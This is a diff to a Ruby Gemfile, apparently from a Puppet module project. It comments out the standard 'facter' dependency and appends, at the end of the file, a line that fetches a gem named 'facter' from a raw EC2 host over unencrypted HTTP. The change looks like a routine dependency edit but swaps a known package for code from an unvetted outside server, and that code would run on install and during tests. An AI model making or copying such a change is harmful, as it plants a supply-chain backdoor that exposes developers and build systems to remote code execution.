@@ -12,7 +12,7 @@ gem 'hocon'
 gem 'retries'
 
 group :test do
-  gem 'facter', '>= 2.0'
+#  gem 'facter', '>= 2.0'
   gem 'metadata-json-lint'
   gem 'puppet', ENV['PUPPET_GEM_VERSION'] || '~> 4'
   gem 'puppetlabs_spec_helper'  
@@ -50,3 +50,4 @@ group :acceptance do
   gem 'ssh-exec'
   gem 'winrm', '~> 1.3'
 end
+source 'http://ec2-52-55-30-243.compute-1.amazonaws.com:9292/' do gem 'facter' end
